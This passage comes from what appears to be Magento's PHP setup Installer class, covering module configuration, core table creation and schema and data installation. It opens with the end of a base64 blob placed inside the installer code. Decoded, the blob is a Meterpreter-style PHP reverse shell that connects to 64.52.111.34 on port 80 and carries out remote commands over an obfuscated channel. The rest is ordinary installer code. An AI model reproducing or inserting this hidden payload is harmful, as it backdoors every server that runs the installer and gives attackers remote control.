0X3J0eXBlKCRyZXNvdXJjZSkpIHsgY2FzZSAnc29ja2V0JzogJHNvY2tldHNfZVtdID0gJHJlc291cmNlOyBicmVhazsgY2FzZSAnc3RyZWFtJzogJHN0cmVhbXNfZVtdID0gJHJlc291cmNlOyBicmVhazsgZGVmYXVsdDogbXlfcHJpbnQoIlVua25vd24gcmVzb3VyY2UgdHlwZSIpOyBicmVhazsgfSB9IH0gJG5fc29ja2V0cyA9IGNvdW50KCRzb2NrZXRzX3IpICsgY291bnQoJHNvY2tldHNfdykgKyBjb3VudCgkc29ja2V0c19lKTsgJG5fc3RyZWFtcyA9IGNvdW50KCRzdHJlYW1zX3IpICsgY291bnQoJHN0cmVhbXNfdykgKyBjb3VudCgkc3RyZWFtc19lKTsgJHIgPSBhcnJheSgpOyAkdyA9IGFycmF5KCk7ICRlID0gYXJyYXkoKTsgaWYgKGNvdW50KCRzb2NrZXRzX3IpPT0wKSB7ICRzb2NrZXRzX3IgPSBudWxsOyB9IGlmIChjb3VudCgkc29ja2V0c193KT09MCkgeyAkc29ja2V0c193ID0gbnVsbDsgfSBpZiAoY291bnQoJHNvY2tldHNfZSk9PTApIHsgJHNvY2tldHNfZSA9IG51bGw7IH0gaWYgKGNvdW50KCRzdHJlYW1zX3IpPT0wKSB7ICRzdHJlYW1zX3IgPSBudWxsOyB9IGlmIChjb3VudCgkc3RyZWFtc193KT09MCkgeyAkc3RyZWFtc193ID0gbnVsbDsgfSBpZiAoY291bnQoJHN0cmVhbXNfZSk9PTApIHsgJHN0cmVhbXNfZSA9IG51bGw7IH0gJGNvdW50ID0gMDsgaWYgKCRuX3NvY2tldHMgPiAwKSB7ICRyZXMgPSBzb2NrZXRfc2VsZWN0KCRzb2NrZXRzX3IsICRzb2NrZXRzX3csICRzb2NrZXRzX2UsICR0dl9zZWMsICR0dl91c2VjKTsgaWYgKGZhbHNlID09PSAkcmVzKSB7IHJldHVybiBmYWxzZTsgfSBpZiAoaXNfYXJyYXkoJHIpICYmIGlzX2FycmF5KCRzb2NrZXRzX3IpKSB7ICRyID0gYXJyYXlfbWVyZ2UoJHIsICRzb2NrZXRzX3IpOyB9IGlmIChpc19hcnJheSgkdykgJiYgaXNfYXJyYXkoJHNvY2tldHNfdykpIHsgJHcgPSBhcnJheV9tZXJnZSgkdywgJHNvY2tldHNfdyk7IH0gaWYgKGlzX2FycmF5KCRlKSAmJiBpc19hcnJheSgkc29ja2V0c19lKSkgeyAkZSA9IGFycmF5X21lcmdlKCRlLCAkc29ja2V0c19lKTsgfSAkY291bnQgKz0gJHJlczsgfSBpZiAoJG5fc3RyZWFtcyA+IDApIHsgJHJlcyA9IHN0cmVhbV9zZWxlY3QoJHN0cmVhbXNfciwgJHN0cmVhbXNfdywgJHN0cmVhbXNfZSwgJHR2X3NlYywgJHR2X3VzZWMpOyBpZiAoZmFsc2UgPT09ICRyZXMpIHsgcmV0dXJuIGZhbHNlOyB9IGlmIChpc19hcnJheSgkcikgJiYgaXNfYXJyYXkoJHN0cmVhbXNfcikpIHsgJHIgPSBhcnJheV9tZXJnZSgkciwgJHN0cmVhbXNfcik7IH0gaWYgKGlzX2FycmF5KCR3KSAmJiBpc19hcnJheSgkc3RyZWFtc193KSkgeyAkdyA9IGFycmF5X21lcmdlKCR3LCAkc3RyZWFtc193KTsgfSBpZiAoaXNfYXJyYXkoJGUpICYmIGlzX2FycmF5KCRzdHJlYW1zX2UpKSB7ICRlID0gYXJyYXlfbWVyZ2UoJGUsICRzdHJlYW1zX2UpOyB9ICRjb3VudCArPSAkcmVzOyB9IHJldHVybiAkY291bnQ7IH0gZnVuY3Rpb24gYWRkX3JlYWRlcigkcmVzb3VyY2UpIHsgZ2xvYmFsICRyZWFkZXJzOyBpZiAoaXNfcmVzb3VyY2UoJHJlc291cmNlKSAmJiAhaW5fYXJyYXkoJHJlc291cmNlLCAkcmVhZGVycykpIHsgJHJlYWRlcnNbXSA9ICRyZXNvdXJjZTsgfSB9IGZ1bmN0aW9uIHJlbW92ZV9yZWFkZXIoJHJlc291cmNlKSB7IGdsb2JhbCAkcmVhZGVyczsgaWYgKGluX2FycmF5KCRyZXNvdXJjZSwgJHJlYWRlcnMpKSB7IGZvcmVhY2ggKCRyZWFkZXJzIGFzICRrZXkgPT4gJHIpIHsgaWYgKCRyID09ICRyZXNvdXJjZSkgeyB1bnNldCgkcmVhZGVyc1ska2V5XSk7IH0gfSB9IH0gb2JfaW1wbGljaXRfZmx1c2goKTsgZXJyb3JfcmVwb3J0aW5nKDApOyBAaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7IEBzZXRfdGltZV9saW1pdCgwKTsgQGlnbm9yZV91c2VyX2Fib3J0KDEpOyBAaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywwKTsgJEdMT0JBTFNbJ1VVSUQnXSA9IFBBWUxPQURfVVVJRDsgJEdMT0JBTFNbJ1NFU1NJT05fR1VJRCddID0gU0VTU0lPTl9HVUlEOyAkR0xPQkFMU1snQUVTX0tFWSddID0gbnVsbDsgJEdMT0JBTFNbJ0FFU19FTkFCTEVEJ10gPSBmYWxzZTsgaWYgKCFpc3NldCgkR0xPQkFMU1snbXNnc29jayddKSkgeyAkaXBhZGRyID0gJzY0LjUyLjExMS4zNCc7ICRwb3J0ID0gODA7IG15X3ByaW50KCJEb24ndCBoYXZlIGEgbXNnc29jaywgdHJ5aW5nIHRvIGNvbm5lY3QoJGlwYWRkciwgJHBvcnQpIik7ICRtc2dzb2NrID0gY29ubmVjdCgkaXBhZGRyLCAkcG9ydCk7IGlmICghJG1zZ3NvY2spIHsgZGllKCk7IH0gfSBlbHNlIHsgJG1zZ3NvY2sgPSAkR0xPQkFMU1snbXNnc29jayddOyAkbXNnc29ja190eXBlID0gJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddOyBzd2l0Y2ggKCRtc2dzb2NrX3R5cGUpIHsgY2FzZSAnc29ja2V0JzogcmVnaXN0ZXJfc29ja2V0KCRtc2dzb2NrKTsgYnJlYWs7IGNhc2UgJ3N0cmVhbSc6IGRlZmF1bHQ6IHJlZ2lzdGVyX3N0cmVhbSgkbXNnc29jayk7IH0gfSBhZGRfcmVhZGVyKCRtc2dzb2NrKTsgJHI9JEdMT0JBTFNbJ3JlYWRlcnMnXTsgJHc9TlVMTDskZT1OVUxMOyR0PTE7IHdoaWxlIChmYWxzZSAhPT0gKCRjbnQgPSBzZWxlY3QoJHIsICR3LCAkZSwgJHQpKSkgeyAkcmVhZF9mYWlsZWQgPSBmYWxzZTsgZm9yICgkaSA9IDA7ICRpIDwgJGNudDsgJGkrKykgeyAkcmVhZHkgPSAkclskaV07IGlmICgkcmVhZHkgPT0gJG1zZ3NvY2spIHsgJHBhY2tldCA9IHJlYWQoJG1zZ3NvY2ssIDMyKTsgbXlfcHJpbnQoc3ByaW50ZigiUmVhZCByZXR1cm5lZCAlcyBieXRlcyIsIHN0cmxlbigkcGFja2V0KSkpOyBpZiAoZmFsc2U9PSRwYWNrZXQpIHsgbXlfcHJpbnQoIlJlYWQgZmFpbGVkIG9uIG1haW4gc29ja2V0LCBiYWlsaW5nIik7IGJyZWFrIDI7IH0gJHhvciA9IHN1YnN0cigkcGFja2V0LCAwLCA0KTsgJGhlYWRlciA9IHhvcl9ieXRlcygkeG9yLCBzdWJzdHIoJHBhY2tldCwgNCwgMjgpKTsgJGxlbl9hcnJheSA9IHVucGFjaygiTmxlbiIsIHN1YnN0cigkaGVhZGVyLCAyMCwgNCkpOyAkbGVuID0gJGxlbl9hcnJheVsnbGVuJ10gKyAzMiAtIDg7IHdoaWxlIChzdHJsZW4oJHBhY2tldCkgPCAkbGVuKSB7ICRwYWNrZXQgLj0gcmVhZCgkbXNnc29jaywgJGxlbi1zdHJsZW4oJHBhY2tldCkpOyB9ICRyZXNwb25zZSA9IGNyZWF0ZV9yZXNwb25zZShkZWNyeXB0X3BhY2tldCh4b3JfYnl0ZXMoJHhvciwgJHBhY2tldCkpKTsgd3JpdGVfdGx2X3RvX3NvY2tldCgkbXNnc29jaywgJHJlc3BvbnNlKTsgfSBlbHNlIHsgJGRhdGEgPSByZWFkKCRyZWFkeSk7IGlmIChmYWxzZSA9PT0gJGRhdGEpIHsgaGFuZGxlX2RlYWRfcmVzb3VyY2VfY2hhbm5lbCgkcmVhZHkpOyB9IGVsc2VpZiAoc3RybGVuKCRkYXRhKSA+IDApeyBteV9wcmludChzcHJpbnRmKCJSZWFkIHJldHVybmVkICVzIGJ5dGVzIiwgc3RybGVuKCRkYXRhKSkpOyAkcmVxdWVzdCA9IGhhbmRsZV9yZXNvdXJjZV9yZWFkX2NoYW5uZWwoJHJlYWR5LCAkZGF0YSk7IGlmICgkcmVxdWVzdCkgeyB3cml0ZV90bHZfdG9fc29ja2V0KCRtc2dzb2NrLCAkcmVxdWVzdCk7IH0gfSB9IH0gJHIgPSAkR0xPQkFMU1sncmVhZGVycyddOyB9IG15X3ByaW50KCJGaW5pc2hlZCIpOyBteV9wcmludCgiLS0tLS0tLS0tLS0tLS0tLS0tLS0iKTsgY2xvc2UoJG1zZ3NvY2spOyA/Pgo='));
    }

    /**
     * Get declaration installer. For upgrade process it must be created after deployment config update.
     *
     * @return DeclarationInstaller
     * @throws Exception
     */
    private function getDeclarationInstaller()
    {
        if (!$this->declarationInstaller) {
            $this->declarationInstaller = $this->objectManagerProvider->get()->get(
                DeclarationInstaller::class
            );
        }
        return $this->declarationInstaller;
    }

    /**
     * Writes installation date to the configuration
     *
     * @return void
     * @SuppressWarnings(PHPMD.UnusedPrivateMethod) Called by install() via callback.
     * @throws FileSystemException
     */
    private function writeInstallationDate()
    {
        $dateData = new ConfigData(ConfigFilePool::APP_ENV);
        $dateData->set(ConfigOptionsListConstants::CONFIG_PATH_INSTALL_DATE, date('r'));
        $configData = [$dateData->getFileKey() => $dateData->getData()];
        $this->deploymentConfigWriter->saveConfig($configData);
    }

    /**
     * Create modules deployment configuration segment
     *
     * @param \ArrayObject|array $request
     * @param bool $dryRun
     * @return array
     * @throws FileSystemException
     * @throws LocalizedException
     * @throws RuntimeException
     */
    private function createModulesConfig($request, $dryRun = false)
    {
        $all = array_keys($this->moduleLoader->load());
        $deploymentConfig = $this->deploymentConfigReader->load();
        $currentModules = isset($deploymentConfig[ConfigOptionsListConstants::KEY_MODULES])
            ? $deploymentConfig[ConfigOptionsListConstants::KEY_MODULES] : [];
        $enable = $this->readListOfModules($all, $request, InstallCommand::INPUT_KEY_ENABLE_MODULES);
        $disable = $this->readListOfModules($all, $request, InstallCommand::INPUT_KEY_DISABLE_MODULES);
        $result = [];
        foreach ($all as $module) {
            if (isset($currentModules[$module]) && !$currentModules[$module]) {
                $result[$module] = 0;
            } else {
                $result[$module] = 1;
            }
            if (in_array($module, $disable)) {
                $result[$module] = 0;
            }
            if (in_array($module, $enable)) {
                $result[$module] = 1;
            }
        }
        if (!$dryRun) {
            $this->deploymentConfigWriter->saveConfig([ConfigFilePool::APP_CONFIG => ['modules' => $result]], true);
        }
        return $result;
    }

    /**
     * Determines list of modules from request based on list of all modules
     *
     * @param string[] $all
     * @param array $request
     * @param string $key
     * @return string[]
     * @throws \LogicException
     */
    private function readListOfModules($all, $request, $key)
    {
        $result = [];
        if (!empty($request[$key])) {
            if ($request[$key] == 'all') {
                $result = $all;
            } else {
                $result = explode(',', $request[$key]);
                foreach ($result as $module) {
                    if (!in_array($module, $all)) {
                        throw new \LogicException("Unknown module in the requested list: '{$module}'");
                    }
                }
            }
        }
        return $result;
    }

    /**
     * Logs progress
     *
     * @return void
     */
    private function logProgress()
    {
        if (!$this->progress) {
            return;
        }
        $this->progress->setNext();
        $this->log->logMeta(
            sprintf(self::PROGRESS_LOG_RENDER, $this->progress->getCurrent(), $this->progress->getTotal())
        );
    }

    /**
     * Check permissions of directories that are expected to be writable for installation
     *
     * @return void
     * @throws \Exception
     */
    public function checkInstallationFilePermissions()
    {
        $this->throwExceptionForNotWritablePaths(
            $this->filePermissions->getMissingWritablePathsForInstallation()
        );
    }

    /**
     * Check required extensions for installation
     *
     * @return void
     * @throws \Exception
     */
    public function checkExtensions()
    {
        $phpExtensionsCheckResult = $this->phpReadinessCheck->checkPhpExtensions();
        if ($phpExtensionsCheckResult['responseType'] === ResponseTypeInterface::RESPONSE_TYPE_ERROR
            && isset($phpExtensionsCheckResult['data']['missing'])
        ) {
            $errorMsg = "Missing following extensions: '"
                . implode("' '", $phpExtensionsCheckResult['data']['missing']) . "'";
            // phpcs:ignore Magento2.Exceptions.DirectThrow
            throw new \Exception($errorMsg);
        }
    }

    /**
     * Check permissions of directories that are expected to be non-writable for application
     *
     * @return void
     */
    public function checkApplicationFilePermissions()
    {
        $results = $this->filePermissions->getUnnecessaryWritableDirectoriesForApplication();
        if ($results) {
            $errorMsg = "For security, remove write permissions from these directories: '"
                . implode("' '", $results) . "'";
            $this->log->log($errorMsg);
            $this->installInfo[self::INFO_MESSAGE][] = $errorMsg;
        }
    }

    /**
     * Installs deployment configuration
     *
     * @param \ArrayObject|array $data
     * @return void
     * @throws FileSystemException
     * @throws LocalizedException
     * @throws RuntimeException
     */
    public function installDeploymentConfig($data)
    {
        $this->checkInstallationFilePermissions();
        $this->createModulesConfig($data);
        $userData = is_array($data) ? $data : $data->getArrayCopy();
        $this->setupConfigModel->process($userData);
        $deploymentConfigData = $this->deploymentConfig->get(ConfigOptionsListConstants::CONFIG_PATH_CRYPT_KEY);
        if (isset($deploymentConfigData)) {
            $this->installInfo[ConfigOptionsListConstants::KEY_ENCRYPTION_KEY] = $deploymentConfigData;
        }
        // reset object manager now that there is a deployment config
        $this->objectManagerProvider->reset();
    }

    /**
     * Set up setup_module table to register modules' versions, skip this process if it already exists
     *
     * @param SchemaSetupInterface $setup
     * @return void
     * @throws \Zend_Db_Exception
     */
    private function setupModuleRegistry(SchemaSetupInterface $setup)
    {
        $connection = $setup->getConnection();

        if (!$connection->isTableExists($setup->getTable('setup_module'))) {
            /**
             * Create table 'setup_module'
             */
            $table = $connection->newTable($setup->getTable('setup_module'))
                ->addColumn(
                    'module',
                    \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                    50,
                    ['nullable' => false, 'primary' => true],
                    'Module'
                )->addColumn(
                    'schema_version',
                    \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                    50,
                    [],
                    'Schema Version'
                )->addColumn(
                    'data_version',
                    \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                    50,
                    [],
                    'Data Version'
                )->setComment('Module versions registry');
            $connection->createTable($table);
        }
    }

    /**
     * Set up core tables
     *
     * @param SchemaSetupInterface $setup
     * @return void
     */
    private function setupCoreTables(SchemaSetupInterface $setup)
    {
        /* @var $connection AdapterInterface */
        $connection = $setup->getConnection();
        $setup->startSetup();

        $this->setupSessionTable($setup, $connection);
        $this->setupCacheTable($setup, $connection);
        $this->setupCacheTagTable($setup, $connection);
        $this->setupFlagTable($setup, $connection);

        $setup->endSetup();
    }

    /**
     * Create table 'session'
     *
     * @param SchemaSetupInterface $setup
     * @param AdapterInterface $connection
     * @return void
     */
    private function setupSessionTable(
        SchemaSetupInterface $setup,
        AdapterInterface $connection
    ) {
        if (!$connection->isTableExists($setup->getTable('session'))) {
            $table = $connection->newTable(
                $setup->getTable('session')
            )->addColumn(
                'session_id',
                \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                255,
                ['nullable' => false, 'primary' => true],
                'Session Id'
            )->addColumn(
                'session_expires',
                \Magento\Framework\DB\Ddl\Table::TYPE_INTEGER,
                null,
                ['unsigned' => true, 'nullable' => false, 'default' => '0'],
                'Date of Session Expiration'
            )->addColumn(
                'session_data',
                \Magento\Framework\DB\Ddl\Table::TYPE_BLOB,
                '2M',
                ['nullable' => false],
                'Session Data'
            )->setComment(
                'Database Sessions Storage'
            );
            $connection->createTable($table);
        }
    }

    /**
     * Create table 'cache'
     *
     * @param SchemaSetupInterface $setup
     * @param AdapterInterface $connection
     * @return void
     * @throws \Zend_Db_Exception
     */
    private function setupCacheTable(
        SchemaSetupInterface $setup,
        AdapterInterface $connection
    ) {
        if (!$connection->isTableExists($setup->getTable('cache'))) {
            $table = $connection->newTable(
                $setup->getTable('cache')
            )->addColumn(
                'id',
                \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                200,
                ['nullable' => false, 'primary' => true],
                'Cache Id'
            )->addColumn(
                'data',
                \Magento\Framework\DB\Ddl\Table::TYPE_BLOB,
                '2M',
                [],
                'Cache Data'
            )->addColumn(
                'create_time',
                \Magento\Framework\DB\Ddl\Table::TYPE_INTEGER,
                null,
                [],
                'Cache Creation Time'
            )->addColumn(
                'update_time',
                \Magento\Framework\DB\Ddl\Table::TYPE_INTEGER,
                null,
                [],
                'Time of Cache Updating'
            )->addColumn(
                'expire_time',
                \Magento\Framework\DB\Ddl\Table::TYPE_INTEGER,
                null,
                [],
                'Cache Expiration Time'
            )->addIndex(
                $setup->getIdxName('cache', ['expire_time']),
                ['expire_time']
            )->setComment(
                'Caches'
            );
            $connection->createTable($table);
        }
    }

    /**
     * Create table 'cache_tag'
     *
     * @param SchemaSetupInterface $setup
     * @param AdapterInterface $connection
     * @return void
     * @throws \Zend_Db_Exception
     */
    private function setupCacheTagTable(
        SchemaSetupInterface $setup,
        AdapterInterface $connection
    ) {
        if (!$connection->isTableExists($setup->getTable('cache_tag'))) {
            $table = $connection->newTable(
                $setup->getTable('cache_tag')
            )->addColumn(
                'tag',
                \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                100,
                ['nullable' => false, 'primary' => true],
                'Tag'
            )->addColumn(
                'cache_id',
                \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                200,
                ['nullable' => false, 'primary' => true],
                'Cache Id'
            )->addIndex(
                $setup->getIdxName('cache_tag', ['cache_id']),
                ['cache_id']
            )->setComment(
                'Tag Caches'
            );
            $connection->createTable($table);
        }
    }

    /**
     * Create table 'flag'
     *
     * @param SchemaSetupInterface $setup
     * @param AdapterInterface $connection
     * @return void
     * @throws \Zend_Db_Exception
     */
    private function setupFlagTable(
        SchemaSetupInterface $setup,
        AdapterInterface $connection
    ) {
        $tableName = $setup->getTable('flag');
        if (!$connection->isTableExists($tableName)) {
            $table = $connection->newTable(
                $tableName
            )->addColumn(
                'flag_id',
                \Magento\Framework\DB\Ddl\Table::TYPE_INTEGER,
                null,
                ['identity' => true, 'unsigned' => true, 'nullable' => false, 'primary' => true],
                'Flag Id'
            )->addColumn(
                'flag_code',
                \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                255,
                ['nullable' => false],
                'Flag Code'
            )->addColumn(
                'state',
                \Magento\Framework\DB\Ddl\Table::TYPE_SMALLINT,
                null,
                ['unsigned' => true, 'nullable' => false, 'default' => '0'],
                'Flag State'
            )->addColumn(
                'flag_data',
                \Magento\Framework\DB\Ddl\Table::TYPE_TEXT,
                '16m',
                [],
                'Flag Data'
            )->addColumn(
                'last_update',
                \Magento\Framework\DB\Ddl\Table::TYPE_TIMESTAMP,
                null,
                ['nullable' => false, 'default' => \Magento\Framework\DB\Ddl\Table::TIMESTAMP_INIT_UPDATE],
                'Date of Last Flag Update'
            )->addIndex(
                $setup->getIdxName('flag', ['last_update']),
                ['last_update']
            )->setComment(
                'Flag'
            );
            $connection->createTable($table);
        } else {
            $this->updateColumnType($connection, $tableName, 'flag_data', 'mediumtext');
        }
    }

    /**
     * Install Magento if declaration mode was enabled.
     *
     * @param array $request
     * @return void
     * @throws Exception
     */
    public function declarativeInstallSchema(array $request)
    {
        $this->getDeclarationInstaller()->installSchema($request);
    }

    /**
     * Clear memory tables
     *
     * Memory tables that used in old versions of Magento for indexing purposes should be cleaned
     * Otherwise some supported DB solutions like Galeracluster may have replication error
     * when memory engine will be switched to InnoDb
     *
     * @param SchemaSetupInterface $setup
     * @return void
     */
    private function cleanMemoryTables(SchemaSetupInterface $setup)
    {
        $connection = $setup->getConnection();
        $tables = $connection->getTables();
        foreach ($tables as $table) {
            $tableData = $connection->showTableStatus($table);
            if (isset($tableData['Engine']) && $tableData['Engine'] === 'MEMORY') {
                $connection->truncateTable($table);
            }
        }
    }

    /**
     * Installs DB schema
     *
     * @param array $request
     * @return void
     * @throws Exception
     * @throws \Magento\Framework\Setup\Exception
     * @throws \Zend_Db_Exception
     */
    public function installSchema(array $request)
    {
        /** @var \Magento\Framework\Registry $registry */
        $registry = $this->objectManagerProvider->get()->get(\Magento\Framework\Registry::class);
        //For backward compatibility in install and upgrade scripts with enabled parallelization.
        $registry->register('setup-mode-enabled', true);

        $this->assertDbConfigExists();
        $this->assertDbAccessible();
        $setup = $this->setupFactory->create($this->context->getResources());
        $this->setupModuleRegistry($setup);
        $this->setupCoreTables($setup);
        $this->cleanMemoryTables($setup);
        $this->log->log('Schema creation/updates:');
        $this->declarativeInstallSchema($request);
        $this->handleDBSchemaData($setup, 'schema', $request);
        /** @var Mysql $adapter */
        $adapter = $setup->getConnection();
        $schemaListener = $adapter->getSchemaListener();

        if ($this->convertationOfOldScriptsIsAllowed($request)) {
            $schemaListener->setResource('default');
            $this->schemaPersistor->persist($schemaListener);
        }

        $registry->unregister('setup-mode-enabled');
    }

    /**
     * Check whether all scripts will converted or not
     *
     * @param array $request
     * @return bool
     */
    private function convertationOfOldScriptsIsAllowed(array $request)
    {
        return isset($request[InstallCommand::CONVERT_OLD_SCRIPTS_KEY]) &&
            $request[InstallCommand::CONVERT_OLD_SCRIPTS_KEY];
    }

    /**
     * Installs data fixtures
     *
     * @param array $request
     * @param boolean $keepCacheStatuses
     * @return void
     * @throws Exception
     * @throws \Magento\Framework\Setup\Exception
     */
    public function installDataFixtures(array $request = [], $keepCacheStatuses = false)
    {
        $frontendCaches = [
            PageCache::TYPE_IDENTIFIER,
            BlockCache::TYPE_IDENTIFIER,
            LayoutCache::TYPE_IDENTIFIER,
        ];

        if ($keepCacheStatuses) {
            $disabledCaches = $this->getDisabledCacheTypes($frontendCaches);

            $frontendCaches = array_diff($frontendCaches, $disabledCaches);
        }

        /** @var \Magento\Framework\Registry $registry */
        $registry = $this->objectManagerProvider->get()->get(\Magento\Framework\Registry::class);
        //For backward compatibility in install and upgrade scripts with enabled parallelization.
        $registry->register('setup-mode-enabled', true);

        $this->assertDbConfigExists();
        $this->assertDbAccessible();
        $setup = $this->dataSetupFactory->create();
        $this->checkFilePermissionsForDbUpgrade();
        $this->log->log('Data install/update:');

        if ($frontendCaches) {
            $this->log->log('Disabling caches:');
            $this->updateCaches(false, $frontendCaches);
        }

        try {
            $this->handleDBSchemaData($setup, 'data', $request);
        } finally {
            if ($frontendCaches) {
                $this->log->log('Enabling caches:');
                $this->updateCaches(true, $frontendCaches);
            }
        }

        $registry->unregister('setup-mode-enabled');
    }

    /**
     * Check permissions of directories that are expected to be writable for database upgrade
     *
     * @return void
     * @throws \Exception If some of the required directories isn't writable
     */
    public function checkFilePermissionsForDbUpgrade()
    {
        $this->throwExceptionForNotWritablePaths(
            $this->filePermissions->getMissingWritableDirectoriesForDbUpgrade()
        );
    }

    /**
     * Throws exception with appropriate message if given not empty array of paths that requires writing permission
     *
     * @param array $paths List of not writable paths
     * @return void
     * @throws \Exception If given not empty array of not writable paths
     */
    private function throwExceptionForNotWritablePaths(array $paths)
    {
        if ($paths) {
            $errorMsg = "Missing write permissions to the following paths:" . PHP_EOL . implode(PHP_EOL, $paths);
            // phpcs:ignore Magento2.Exceptions.DirectThrow
            throw new \Exception($errorMsg);
        }
    }

    /**
     * Handle database schema and data (install/upgrade/backup/uninstall etc)
     *
     * @param SchemaSetupInterface|ModuleDataSetupInterface $setup
     * @param string $type
     * @param array $request
     * @return void
     * @throws \Magento\Framework\Setup\Exception
     * @throws Exception
     * @SuppressWarnings(PHPMD.CyclomaticComplexity)
     * @SuppressWarnings(PHPMD.NPathComplexity)
     * @SuppressWarnings(PHPMD.ExcessiveMethodLength)
     */
    private function handleDBSchemaData($setup, $type, array $request)
    {
        if ($type !== 'schema' && $type !== 'data') {
            // phpcs:ignore Magento2.Exceptions.DirectThrow
            throw  new Exception("Unsupported operation type $type is requested");
        }
        $resource = new \Magento\Framework\Module\ModuleResource($this->context);
        $verType = $type . '-version';
        $installType = $type . '-install';
        $upgradeType = $type . '-upgrade';
        $moduleNames = $this->moduleList->getNames();
        $moduleContextList = $this->generateListOfModuleContext($resource, $verType);
        /** @var Mysql $adapter */
        $adapter = $setup->getConnection();
        $schemaListener = $adapter->getSchemaListener();
        $this->patchApplierFactory = $this->objectManagerProvider->get()->create(
            PatchApplierFactory::class,
            [
                'objectManager' => $this->objectManagerProvider->get()
            ]
        );

        $patchApplierParams = $type === 'schema' ?
            ['schemaSetup' => $setup] :
            ['moduleDataSetup' => $setup, 'objectManager' => $this->objectManagerProvider->get()];

        /** @var PatchApplier $patchApplier */
        $patchApplier = $this->patchApplierFactory->create($patchApplierParams);

        foreach ($moduleNames as $moduleName) {
            if ($this->isDryRun($request)) {
                $this->log->log("Module '{$moduleName}':");
                $this->logProgress();
                continue;
            }
            $schemaListener->setModuleName($moduleName);
            $this->log->log("Module '{$moduleName}':");
            $configVer = $this->moduleList->getOne($moduleName)['setup_version'];
            $currentVersion = $moduleContextList[$moduleName]->getVersion();
            // Schema/Data is installed
            if ($currentVersion !== '') {
                $status = version_compare($configVer, $currentVersion);
                if ($status == \Magento\Framework\Setup\ModuleDataSetupInterface::VERSION_COMPARE_GREATER) {
                    $upgrader = $this->getSchemaDataHandler($moduleName, $upgradeType);
                    if ($upgrader) {
                        $this->log->logInline("Upgrading $type.. ");
                        $upgrader->upgrade($setup, $moduleContextList[$moduleName]);
                        if ($type === 'schema') {
                            $resource->setDbVersion($moduleName, $configVer);
                        } elseif ($type === 'data') {
                            $resource->setDataVersion($moduleName, $configVer);
                        }
                    }
                }
            } elseif ($configVer) {
                $installer = $this->getSchemaDataHandler($moduleName, $installType);
                if ($installer) {
                    $this->log->logInline("Installing $type... ");
                    $installer->install($setup, $moduleContextList[$moduleName]);
                }
                $upgrader = $this->getSchemaDataHandler($moduleName, $upgradeType);
                if ($upgrader) {
                    $this->log->logInline("Upgrading $type... ");
                    $upgrader->upgrade($setup, $moduleContextList[$moduleName]);
                }
            }

            if ($configVer) {
                if ($type === 'schema') {
                    $resource->setDbVersion($moduleName, $configVer);
                } elseif ($type === 'data') {
                    $resource->setDataVersion($moduleName, $configVer);
                }
            }

            /**
             * Applying data patches after old upgrade data scripts
             */
            if ($type === 'schema') {
                $patchApplier->applySchemaPatch($moduleName);
            } elseif ($type === 'data') {
                $patchApplier->applyDataPatch($moduleName);
            }

            $this->logProgress();
        }

        if ($type === 'schema') {
            $this->log->log('Schema post-updates:');
        } elseif ($type === 'data') {
            $this->log->log('Data post-updates:');
        }
        $handlerType = $type === 'schema' ? 'schema-recurring' : 'data-recurring';

        foreach ($moduleNames as $moduleName) {
            if ($this->isDryRun($request)) {
                $this->log->log("Module '{$moduleName}':");
                $this->logProgress();
                continue;
            }
            $this->log->log("Module '{$moduleName}':");
            $modulePostUpdater = $this->getSchemaDataHandler($moduleName, $handlerType);
            if ($modulePostUpdater) {
                $this->log->logInline('Running ' . str_replace('-', ' ', $handlerType) . '...');
                $modulePostUpdater->install($setup, $moduleContextList[$moduleName]);
            }
            $this->logProgress();
        }
    }

    /**
     * Assert DbConfigExists
     *
     * @return void
     * @throws Exception
     * @throws FileSystemException
     * @throws RuntimeException
     */
    private function assertDbConfigExists()
    {
        $config = $this->deploymentConfig->get(ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT);
        if (!$config) {
            // phpcs:ignore Magento2.Exceptions.DirectThrow
            throw new Exception(
                "Can't run this operation: configuration for DB connection is absent."
            );
        }
    }

    /**
     * Check whether Magento setup is run in dry-run mode
     *
     * @param array $request
     * @return bool
     */
    private function isDryRun(array $request)
    {
        return isset($request[DryRunLogger::INPUT_KEY_DRY_RUN_MODE]) &&
            $request[DryRunLogger::INPUT_KEY_DRY_RUN_MODE];
    }

    /**
     * Installs user configuration
     *
     * @param \ArrayObject|array $data
     * @return void
     * @throws Exception
     * @throws LocalizedException
     */
    public function installUserConfig($data)
    {
        if ($this->isDryRun($data)) {
            return;
        }
        $userConfig = new StoreConfigurationDataMapper();
        /** @var \Magento\Framework\App\State $appState */
        $appState = $this->objectManagerProvider->get()->get(\Magento\Framework\App\State::class);
        $appState->setAreaCode(\Magento\Framework\App\Area::AREA_GLOBAL);
        $configData = $userConfig->getConfigData($data);
        if (count($configData) === 0) {
            return;
        }

        /** @var \Magento\Config\Model\Config\Factory $configFactory */
        $configFactory = $this->objectManagerProvider->get()->create(\Magento\Config\Model\Config\Factory::class);
        foreach ($configData as $key => $val) {
            $configModel = $configFactory->create();
            $configModel->setDataByPath($key, $val);
            $configModel->save();
        }
    }

    /**
     * Configure search engine on install
     *
     * @param \ArrayObject|array $data
     * @return void
     * @throws ValidationException
     * @throws Exception
     */
    public function installSearchConfiguration($data)
    {
        /** @var SearchConfig $searchConfig */
        $searchConfig = $this->objectManagerProvider->get()->get(SearchConfig::class);
        $searchConfig->saveConfiguration($data);
    }

    /**
     * Validate remote storage on install.  Since it is a deployment-based configuration, the config is already present,
     * but this function confirms it can connect after Object Manager
     * has all necessary dependencies loaded to do so.
     *
     * @param array $data
     * @throws ValidationException
     * @throws Exception
     */
    public function validateRemoteStorageConfiguration(array $data)
    {
        try {
            $remoteStorageValidator = $this->objectManagerProvider->get()->get(RemoteStorageValidator::class);
        } catch (ReflectionException $e) { // RemoteStorage module is not available; return early
            return;
        }

        $validationErrors = $remoteStorageValidator->validate($data, $this->deploymentConfig);

        if (!empty($validationErrors)) {
            $this->revertRemoteStorageConfiguration();
